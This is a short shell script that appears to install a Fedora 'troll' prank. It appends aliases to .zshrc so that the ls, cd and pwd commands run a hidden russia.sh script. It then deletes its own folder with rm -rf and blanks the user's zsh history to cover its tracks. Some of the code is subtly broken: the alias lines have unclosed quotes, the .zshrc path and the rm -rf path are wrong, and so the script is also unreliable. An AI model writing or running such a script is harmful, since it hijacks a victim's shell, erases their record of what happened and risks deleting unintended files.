mkdir ~/.trollscript
cd Fed-ora-Troll
mv * ~/.trollscript

echo "alias ls='sh /home/$(whoami)/.trollscript/russia.sh" >> .zshrc
echo "alias cd='sh /home/$(whoami)/.trollscript/russia.sh" >> .zshrc
echo "alias pwd='sh /home/$(whoami)/.trollscript/russia.sh" >> .zshrc

cd
rm -rf ../Fed-ora-Troll
echo "" > ~/.zsh_history & exec $SHELL -l

source .zshrc

